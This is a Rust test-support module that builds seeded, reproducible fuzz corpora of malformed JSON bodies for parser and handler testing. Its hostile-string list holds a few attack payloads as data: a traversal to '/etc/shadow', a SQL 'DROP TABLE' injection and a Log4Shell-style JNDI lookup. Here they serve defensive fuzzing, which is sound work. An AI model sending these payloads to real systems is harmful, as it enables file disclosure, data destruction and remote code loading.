//! Generate seeded byte-reproducible fuzz corpora without clock, filesystem or network input.

#![allow(dead_code)] // Each fuzz binary uses a subset of the generators.

/// Deterministic 64-bit LCG (Knuth's constants); the same sequence every run.
pub struct Lcg(u64);

impl Lcg {
    pub fn new(seed: u64) -> Self {
        Self(seed)
    }

    pub fn next_u64(&mut self) -> u64 {
        self.0 = self
            .0
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        self.0
    }

    /// Uniform enough for corpus selection; not a CSPRNG and never used as one.
    pub fn below(&mut self, bound: usize) -> usize {
        (self.next_u64() % bound as u64) as usize
    }

    pub fn bytes(&mut self, len: usize) -> Vec<u8> {
        let mut out = vec![0u8; len];
        for chunk in out.chunks_mut(8) {
            let value = self.next_u64().to_be_bytes();
            chunk.copy_from_slice(&value[..chunk.len()]);
        }
        out
    }

    pub fn pick<'a, T: ?Sized>(&mut self, from: &'a [&'a T]) -> &'a T {
        from[self.below(from.len())]
    }
}

/// Exercise byte/character/grapheme assumptions and unsafe string concatenation.
pub const HOSTILE_STRINGS: &[&str] = &[
    "",
    " ",
    "\u{0}",
    "\u{feff}",                           // byte order mark mid-string
    "\u{202e}drowssap",                   // right-to-left override
    "\u{200d}\u{200d}\u{200d}",           // zero-width joiners
    "e\u{301}\u{301}\u{301}\u{301}",      // stacked combining marks
    "\u{1f600}\u{1f3fb}\u{200d}\u{2640}", // emoji sequence
    "\r\n",
    "\n",
    "\t",
    "\\",
    "\"",
    "\u{fdfd}", // Arabic ligature with an eighteen-code-point compatibility decomposition
    "ﬁ",        // ligature that folds to two ASCII characters
    "İ",        // uppercase dotted I: lowercases to two code points
    "../../etc/shadow",
    "%2e%2e%2f",
    "'; DROP TABLE devices; --",
    "${jndi:ldap://example.invalid/a}",
    "\u{ff0e}\u{ff0e}\u{ff0f}", // fullwidth path traversal
];

/// JSON escape sequences a decoder must handle or refuse without panicking.
const HOSTILE_ESCAPES: &[&str] = &[
    r#""\ud800""#,       // lone high surrogate
    r#""\udfff""#,       // lone low surrogate
    r#""\ud800\ud800""#, // two high surrogates
    r#""\u0000""#,       // escaped NUL
    r#""\x41""#,         // not a JSON escape
    r#""\""#,            // unterminated escape
    r#""\u00""#,         // truncated escape
];

/// One corpus case with the label that identifies it in a failure.
pub struct Case {
    pub label: String,
    pub bytes: Vec<u8>,
}

impl Case {
    fn new(kind: &str, index: usize, bytes: Vec<u8>) -> Self {
        Self {
            label: format!("{kind}#{index}"),
            bytes,
        }
    }
}

/// A JSON string literal for arbitrary text, escaped the way serde would.
fn quoted(text: &str) -> String {
    serde_json::Value::String(text.to_owned()).to_string()
}

/// A plausible value for a schema field: right shape, hostile content.
fn value(rng: &mut Lcg) -> String {
    match rng.below(10) {
        0 => quoted(rng.pick(HOSTILE_STRINGS)),
        1 => (*rng.pick(HOSTILE_ESCAPES)).to_owned(),
        2 => "true".to_owned(),
        3 => "null".to_owned(),
        4 => format!("{}", rng.next_u64()),
        5 => format!("-{}", rng.next_u64()),
        6 => "1e400".to_owned(), // overflows f64
        7 => format!("[{}]", quoted(rng.pick(HOSTILE_STRINGS))),
        8 => format!("{{\"nested\":{}}}", quoted(rng.pick(HOSTILE_STRINGS))),
        _ => quoted(&"A".repeat(1 + rng.below(4096))),
    }
}

/// Generate structurally shaped JSON with textual duplicate fields to expose parser disagreement.
fn structured(rng: &mut Lcg, keys: &[&str]) -> Vec<u8> {
    let count = 1 + rng.below(keys.len().max(1) * 2);
    let mut fields = Vec::new();
    for _ in 0..count {
        let key = if rng.below(8) == 0 {
            quoted(rng.pick(HOSTILE_STRINGS))
        } else {
            quoted(rng.pick(keys))
        };
        fields.push(format!("{key}:{}", value(rng)));
    }
    format!("{{{}}}", fields.join(",")).into_bytes()
}

/// Bytes that are not valid UTF-8, wrapped in otherwise valid JSON syntax.
fn invalid_utf8(rng: &mut Lcg, keys: &[&str]) -> Vec<u8> {
    let mut out = format!("{{{}:\"", quoted(rng.pick(keys))).into_bytes();
    for _ in 0..1 + rng.below(16) {
        out.push(0x80 | (rng.below(0x40) as u8)); // continuation byte, no lead
    }
    out.extend_from_slice(b"\"}");
    out
}

/// Nested arrays exercise the JSON parser depth limit.
fn deep_nesting(rng: &mut Lcg) -> Vec<u8> {
    let depth = 1 + rng.below(4096);
    let mut out = Vec::with_capacity(depth * 2);
    out.extend(std::iter::repeat_n(b'[', depth));
    out.extend(std::iter::repeat_n(b']', depth));
    out
}

/// Mutate one accepted-body field by replacement, removal, duplication or addition to reach handler checks near the valid boundary.
fn mutated_valid(rng: &mut Lcg, template: &str) -> Vec<u8> {
    let Ok(serde_json::Value::Object(object)) = serde_json::from_str::<serde_json::Value>(template)
    else {
        return template.as_bytes().to_vec();
    };
    let names: Vec<String> = object.keys().cloned().collect();
    if names.is_empty() {
        return template.as_bytes().to_vec();
    }
    let target = names[rng.below(names.len())].clone();
    let mut object = object;
    match rng.below(4) {
        0 => {
            let replacement = value(rng);
            object.insert(
                target,
                serde_json::from_str(&replacement).unwrap_or(serde_json::Value::Null),
            );
        }
        1 => {
            object.remove(&target);
        }
        2 => {
            let key = rng.pick(HOSTILE_STRINGS).to_owned();
            object.insert(key, serde_json::Value::Bool(true));
        }
        _ => {
            // Duplicate fields in JSON text because object maps cannot represent the same key twice.
            let rendered = serde_json::Value::Object(object).to_string();
            let duplicate = format!("{}:{}", quoted(&target), value(rng));
            return rendered
                .replacen('{', &format!("{{{duplicate},"), 1)
                .into_bytes();
        }
    }
    serde_json::Value::Object(object).to_string().into_bytes()
}

/// Mix nine generators deterministically for the given seed/schema, using an accepted template when available.
pub fn body_corpus(seed: u64, count: usize, keys: &[&str], template: &str) -> Vec<Case> {
    let mut rng = Lcg::new(seed);
    let mut cases = Vec::with_capacity(count);
    for index in 0..count {
        let case = match index % 9 {
            0 => {
                let len = rng.below(512);
                Case::new("random", index, rng.bytes(len))
            }
            1 => Case::new("structured", index, structured(&mut rng, keys)),
            2 => {
                // Truncate structured bytes at arbitrary positions to simulate interrupted connections.
                let full = structured(&mut rng, keys);
                let cut = if full.is_empty() {
                    0
                } else {
                    rng.below(full.len())
                };
                Case::new("truncated", index, full[..cut].to_vec())
            }
            3 => Case::new("invalid_utf8", index, invalid_utf8(&mut rng, keys)),
            4 => Case::new("deep_nesting", index, deep_nesting(&mut rng)),
            5 => Case::new(
                "oversized_field",
                index,
                format!(
                    "{{{}:{}}}",
                    quoted(rng.pick(keys)),
                    quoted(&"z".repeat(65_536))
                )
                .into_bytes(),
            ),
            6 => Case::new(
                "hostile_unicode",
                index,
                format!(
                    "{{{}:{}}}",
                    quoted(rng.pick(HOSTILE_STRINGS)),
                    quoted(rng.pick(HOSTILE_STRINGS))
                )
                .into_bytes(),
            ),
            8 if !template.is_empty() => {
                Case::new("mutated_valid", index, mutated_valid(&mut rng, template))
            }
            _ => {
                // Corrupt one byte near an otherwise structured input.
                let mut full = structured(&mut rng, keys);
                if !full.is_empty() {
                    let at = rng.below(full.len());
                    full[at] ^= 1 << rng.below(8);
                }
                Case::new("bitflip", index, full)
            }
        };
        cases.push(case);
    }
    cases
}

/// Split at arbitrary byte boundaries, including empty chunks and the middle of UTF-8 characters.
pub fn chunkings(rng: &mut Lcg, bytes: &[u8]) -> Vec<Vec<Vec<u8>>> {
    let mut all = vec![
        vec![bytes.to_vec()],                           // one chunk
        bytes.iter().map(|byte| vec![*byte]).collect(), // one byte at a time
    ];
    for _ in 0..3 {
        let mut chunks = Vec::new();
        let mut rest = bytes;
        while !rest.is_empty() {
            let take = 1 + rng.below(rest.len());
            let (head, tail) = rest.split_at(take);
            chunks.push(head.to_vec());
            if rng.below(4) == 0 {
                chunks.push(Vec::new()); // an empty read is not an EOF
            }
            rest = tail;
        }
        all.push(chunks);
    }
    all
}

/// Replay committed hand-reduced failures independently of whether a current generator seed still reaches them.
pub fn regressions(section: &str) -> Vec<Case> {
    let path = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("../../../tests/security/fuzz/regressions.json");
    let text = std::fs::read_to_string(&path)
        .unwrap_or_else(|error| panic!("regression corpus at {}: {error}", path.display()));
    let document: serde_json::Value = serde_json::from_str(&text).expect("regression corpus json");
    let entries = document[section]
        .as_array()
        .unwrap_or_else(|| panic!("regression corpus has no {section} section"));
    entries
        .iter()
        .enumerate()
        .map(|(index, entry)| {
            let bytes = match (
                entry["text"].as_str(),
                entry["base64"].as_str(),
                entry["hex"].as_str(),
            ) {
                (Some(text), _, _) => text.as_bytes().to_vec(),
                (None, Some(encoded), _) => {
                    sparkd::crypto::base64url_decode(encoded).expect("regression case base64url")
                }
                (None, None, Some(encoded)) => hex::decode(encoded).expect("regression case hex"),
                _ => panic!("{section}#{index} carries no bytes"),
            };
            assert!(
                entry["why"].as_str().is_some_and(|why| !why.is_empty()),
                "{section}#{index} must say what it caught"
            );
            Case::new(section, index, bytes)
        })
        .collect()
}
